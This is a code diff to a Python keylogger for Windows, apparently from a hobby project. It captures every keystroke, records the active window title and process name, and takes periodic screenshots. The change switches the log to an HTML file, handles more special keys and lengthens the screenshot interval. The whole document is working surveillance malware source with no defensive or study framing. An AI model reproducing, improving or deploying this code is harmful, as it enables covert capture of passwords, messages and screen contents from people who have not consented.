@@ -1,29 +1,26 @@
 import datetime
 import os
-# Removed the 'io' because it didn't really help with the char issue.
 import psutil
 import win32gui
 import win32process
 from pynput import keyboard
 from PIL import ImageGrab
+from unidecode import unidecode
 
-
-# Get the current directory (I would change this soon...)
+# Get the current directory
 current_dir = os.getcwd()
 
-# Open the log file for writing
-log_file = open(os.path.join(current_dir, "keystrokes.log"), "w")
-
 # Set the x interval for taking screenshots (in seconds)
-screenshot_interval = 20
+screenshot_interval = 120
 last_screenshot_time = datetime.datetime.now()
 
 # Track the current window title and process name
 current_window_title = None
 current_process_name = None
 
-# Another shit for the shift.
-shift_pressed = False
+# Create the HTML log file but for some reason I can't figure out how to add another div for the key-pressed without adding a new line
+log_file = open(os.path.join(current_dir, "keystrokes.html"), "w", encoding="utf-8")
+log_file.write('<html>\n<head>\n<meta charset="utf-8">\n<title>Keystrokes Log</title>\n<style>\n.highlight{background-color:#dedede;color:#000000;padding:0.2em;margin-top:0.2cm;margin-bottom:0.2cm;font-family:Arial, Helvetica, sans-serif;}\n</style>\n</head>\n<body>\n')
 
 
 # This function gets called every time a key is pressed
@@ -34,16 +31,16 @@ def on_press(key):
         window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
         pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
         process_name = psutil.Process(pid[-1]).name()
-        
+
         # If the window or process has changed, write them to the log file
         if window_title != current_window_title or process_name != current_process_name:
             if current_window_title is not None:
-                log_file.write("\n")
-                
+                log_file.write("</div>\n")
+
             current_window_title = window_title
             current_process_name = process_name
-            now = datetime.datetime.now()            
-            log_file.write(f"{now.strftime('%A, %B %d, %Y [%I:%M %p]')} {current_process_name} - {current_window_title}\n")
+            now = datetime.datetime.now()
+            log_file.write(f'<div class="highlight">{now.strftime("%A, %B %d, %Y [%I:%M %p]")} {current_process_name} - {current_window_title}</div>\n')
         
         if isinstance(key, keyboard.Key):
             # Handle special keys
@@ -55,7 +52,9 @@ def on_press(key):
                 key_char = "[Tab]"
             elif key == keyboard.Key.backspace:
                 key_char = "[Backspace]"
-            elif key == keyboard.Key.shift:
+            elif key == keyboard.Key.shift_l:
+                key_char = ""
+            elif key == keyboard.Key.shift_r:
                 key_char = ""
             elif key == keyboard.Key.alt_l:
                 key_char = "[L Alt]"
@@ -65,15 +64,33 @@ def on_press(key):
                 key_char = "[L Ctrl]"
             elif key == keyboard.Key.ctrl_r:
                 key_char = "[R Ctrl]"
+            elif key == keyboard.Key.right:
+                key_char = "[Right]"
+            elif key ==  keyboard.Key.left:
+                key_char = "[Left]"
+            elif key == keyboard.Key.up:
+                key_char = "[Up]"
+            elif key ==  keyboard.Key.down:
+                key_char = "[Down]"
             else:
-                key_char = f"[{str(key)}]"
+                # Handle normal keys
+                if hasattr(key, 'char'):
+                    key_char = key.char
+                else: # So this part and below fixes the charmap problem in the logs while the other fixes the console one.
+                    key_char = str(key)
+                if key_char == '\u25cf':
+                    key_char = ''
         else:
-            # Handle regular keys
             key_char = str(key.char)
-            # Handle uppercase letters if shift key is pressed
             if keyboard.Controller().shift_pressed:
                 key_char = key_char.upper()
-        log_file.write(key_char.encode('utf-8', errors='ignore').decode('utf-8'))
+        key_char = unidecode(key_char)
+        
+        # Encode the output to utf-8
+        log_file.write(key_char.encode("utf-8").decode())
+        #log_file.write(f'<p class="key-pressed">{key_char.encode("utf-8").decode()}</p>')
+
+
         log_file.flush()
 
         # Take a screenshot if it's time
